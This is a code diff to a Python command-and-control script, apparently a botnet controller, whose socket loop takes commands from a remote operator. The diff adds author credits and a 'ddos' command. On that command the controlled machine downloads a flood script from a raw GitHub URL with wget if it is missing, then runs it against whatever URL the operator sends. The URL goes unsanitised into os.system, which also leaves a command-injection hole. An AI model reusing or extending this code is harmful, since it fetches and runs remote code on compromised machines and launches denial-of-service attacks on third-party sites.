@@ -20,6 +20,8 @@ class Controller(object):
         time.sleep(1.5)
         print('-----------------------------------------------------------------')
         print(Fore.WHITE + '[' + Fore.GREEN + '+' + Fore.WHITE + ']Made By AL104 & Droid')
+        print("Github:https://github.com/FonderElite")
+        print("Github:https://github.com/abalesluke")
         print('-----------------------------------------------------------------')
         time.sleep(1.5)
 
@@ -45,6 +47,13 @@ class Controller(object):
                     client_socket.send(f'connection closed from {ip}'.encode())
                     client_socket.close()
                     break
+                elif cmd == 'ddos':
+                    url = client_socket.recv(1024).decode()
+                    if os.path.exists('ddos.py'):
+                        os.system('python3 ddos.py -d {}'.format(url))
+                    else:
+                        os.system('wget https://raw.githubusercontent.com/abalesluke/website_finder/main/ddos.py')
+                        os.system('python3 ddos.py -d {}'.format(url))
                 elif cmd == 'close':
                     print(f'connection closed from {client_address}\n')
                     client_socket.close()
@@ -72,7 +81,7 @@ if __name__ == "__main__":
          `d8888888b' 
            `d8888b' `
              `bd'
-    ''',)) 
+    ''',))
     banner.start()
     banner.join()
     while True:
